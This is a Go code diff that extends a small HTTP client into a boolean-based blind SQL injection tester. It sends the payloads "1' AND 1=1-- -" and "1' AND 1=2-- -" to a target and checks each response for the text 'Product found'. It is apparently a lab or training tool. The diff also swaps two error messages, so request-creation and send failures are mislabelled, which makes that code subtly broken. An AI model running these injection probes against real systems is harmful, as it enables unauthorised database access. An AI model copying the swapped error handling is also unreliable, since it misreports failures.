@@ -4,6 +4,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -43,7 +44,7 @@ func urlValidator(raw string) error {
 
 func NewHTTPClient(baseURL string, timeOut time.Duration) (HTTPClient, error) {
 	if timeOut <= 0 {
-		return HTTPClient{}, errors.New("timeout cannot be less zero")
+		return HTTPClient{}, errors.New("timeout must be positive")
 	}
 
 	if err := urlValidator(baseURL); err != nil {
@@ -73,13 +74,18 @@ func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
 
 	req, err := http.NewRequest(http.MethodGet, targetURL, nil)
 	if err != nil {
-		return Observation{}, fmt.Errorf("create new request %w", err)
+		return Observation{}, fmt.Errorf("send request %w", err)
 	}
 
 	resp, err := c.Client.Do(req)
 	if err != nil {
-		return Observation{}, fmt.Errorf("send request %w", err)
+		var netErr net.Error
+		if errors.As(err, &netErr) && netErr.Timeout() {
+			return Observation{}, fmt.Errorf("request timeout %w", err)
+		}
+		return Observation{}, fmt.Errorf("create new request %w", err)
 	}
+
 	defer resp.Body.Close()
 
 	limitedReader := io.LimitReader(resp.Body, 1024*1024)
@@ -118,13 +124,24 @@ func main() {
 		os.Exit(1)
 	}
 
-	result, err := client.SendPayload("' or 1=1 -- ")
-	if err != nil {
-		fmt.Fprintln(os.Stderr, err)
-		os.Exit(1)
+	payloads := []string{
+		"1' AND 1=1-- -",
+		"1' AND 1=2-- -",
 	}
-	printResult(result)
 
-	ok := bodyContainsOracle(result, "Product found")
-	fmt.Println("Oracle:", ok)
+	for _, payload := range payloads {
+		result, err := client.SendPayload(payload)
+		if err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			continue
+		}
+
+		ok := bodyContainsOracle(result, "Product found")
+
+		fmt.Println("Payload:", payload)
+		fmt.Println("Status:", result.Status)
+		fmt.Println("Body:", result.Body)
+		fmt.Println("Oracle:", ok)
+		fmt.Println()
+	}
 }
